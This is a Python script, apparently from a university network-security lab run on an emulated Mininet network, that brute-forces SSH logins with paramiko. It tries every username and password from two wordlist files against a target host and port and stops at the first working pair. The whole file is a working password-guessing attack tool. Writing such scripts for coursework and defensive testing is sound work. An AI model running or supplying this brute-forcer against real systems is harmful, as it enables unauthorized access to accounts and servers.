import argparse
import paramiko


def try_ssh(ip, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"Success: {username}:{password} on {ip}:{port}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed: {username}:{password} on {ip}:{port}")
        return False
    except Exception as e:
        print(f"Error connecting to {ip}:{port} - {e}")
        return False
    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", default="10.12.0.10")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--users", default="/home/mininet/LINFO2347/repo/bf/users.txt")
    parser.add_argument(
        "--passwords", default="/home/mininet/LINFO2347/repo/bf/passwords.txt"
    )
    args = parser.parse_args()

    with open(args.users, "r") as f:
        usernames = [line.strip() for line in f]
    with open(args.passwords, "r") as f:
        passwords = [line.strip() for line in f]

    found = False
    for username in usernames:
        for password in passwords:
            if try_ssh(args.ip, args.port, username, password):
                found = True
                break
        if found:
            break


if __name__ == "__main__":
    main()
